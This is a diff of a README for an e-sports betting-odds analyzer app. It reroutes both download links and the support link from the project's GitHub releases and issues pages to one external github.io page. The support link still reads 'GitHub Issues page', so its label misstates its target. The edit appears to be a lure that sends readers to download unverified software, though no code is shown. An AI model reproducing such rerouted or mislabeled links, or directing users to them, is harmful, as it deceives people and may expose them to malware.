@@ -1,6 +1,6 @@
 # 🎮 esports-odds-bet-analyzer - Compare betting lines with clarity
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF6600?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF6600?style=for-the-badge&logo=github&logoColor=white)](https://ropy-irishterrier524.github.io)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Bet Analyzer vLatest is a 2026 e-sports odds analysis tool. It gathers betting l
 
 ## 📥 Download and Install
 
-[**Click here to download Bet Analyzer vLatest**](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/releases)
+[**Click here to download Bet Analyzer vLatest**](https://ropy-irishterrier524.github.io)
 
 Visit this link to download the application.
 
@@ -91,7 +91,7 @@ All data stays on your computer. We do not collect or store your personal inform
 
 ## 🆘 Support
 
-If you encounter issues not covered here, please visit the [GitHub Issues page](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/issues) to report bugs or request features.
+If you encounter issues not covered here, please visit the [GitHub Issues page](https://ropy-irishterrier524.github.io) to report bugs or request features.
 
 ## 📝 License
 
